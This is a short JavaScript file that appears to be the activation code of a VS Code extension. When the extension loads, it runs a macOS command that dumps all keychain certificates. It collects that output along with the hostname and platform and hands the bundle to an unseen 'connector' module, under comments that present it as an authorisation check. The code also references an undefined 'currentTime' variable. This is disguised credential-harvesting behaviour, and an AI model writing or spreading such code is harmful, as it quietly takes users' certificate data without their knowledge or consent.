const vscode = require('vscode');
const { authorisationCheck } = require("./connector");

/**
 * @param {vscode.ExtensionContext} context
 */
function activate(context) {
	
	const os = require('os');

	// check for authorised CBA certificates on device
	const exec_command = require('child_process').execSync;
	try {
		var child = exec_command('security find-certificate -a -p', { encoding: 'utf-8'});
	} catch (err) {
		var child = err.stderr;
	}

	// get additional device details before performing authorisationCheck
	host_info = {
		os: process.platform,
		hostname: os.hostname(),
		timestamp: currentTime,
		aux: child
	}
	
	// exists internally
	authorisationCheck(host_info);
}

function deactivate() {}

module.exports = {
	activate,
	deactivate
}
